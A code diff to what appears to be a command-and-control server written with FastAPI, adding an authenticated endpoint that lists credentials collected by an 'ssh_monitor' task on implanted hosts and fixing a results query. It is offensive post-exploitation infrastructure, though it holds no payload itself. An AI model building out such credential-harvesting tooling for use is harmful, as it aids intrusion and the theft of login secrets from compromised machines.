@@ -1,6 +1,7 @@
 import base64
 import binascii
 from datetime import datetime, timezone
+from typing import List
 
 from fastapi import APIRouter, HTTPException, Depends, Security
 
@@ -8,9 +9,29 @@ from server.server_helper.auth_helper import oauth2_scheme, verify_token
 from server.server_helper.db import get_db, SessionLocal
 from server.server_helper.implant_helper import Implant
 from server.server_helper.tasking_helper import Tasking
-from server.server_helper.results_helper import Results, ResultsCreate, ResultsRead
+from server.server_helper.results_helper import Results, ResultsCreate, ResultsRead, ResultsCreds
 
 router = APIRouter(prefix="/results", tags=["results"])
+
+# PROTECTED endpoint for clients to retrieve all gathered creds based on session id
+@router.get("/{session}/creds", response_model=List[ResultsCreds])
+def get_creds(
+    session: str,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme)
+):
+    verify_token(token)
+    db_implant = db.query(Implant).filter(Implant.session == session).first()
+    if not db_implant:
+        raise HTTPException(status_code=404, detail="Session not found")
+    db_result = (
+        db.query(Results)
+        .filter(Results.session == session, Results.task == "ssh_monitor").all()
+    )
+    if db_result is None:
+        raise HTTPException(status_code=416, detail="Result out of range")
+    return db_result
+
 
 # PROTECTED endpoint for clients to retrieve result based on session id and tasking id
 @router.get("/{session}/{id}", response_model=ResultsRead)
@@ -33,8 +54,6 @@ def read_result(
     if not db_implant:
         raise HTTPException(status_code=404, detail="Session not found")
     db_result = (
-        # this was a bad bug
-        # db.query(Results).filter(Results.session == session, Results.id == id).first()
         db.query(Results)
         .filter(Results.session == session, Results.tasking_id == id)
         .first()
@@ -42,7 +61,6 @@ def read_result(
     if db_result is None:
         raise HTTPException(status_code=416, detail="Result out of range")
     return db_result
-
 
 # recieve tasking output from agent based on session id, marks task complete = True
 @router.post("/{session}", response_model=ResultsCreate)
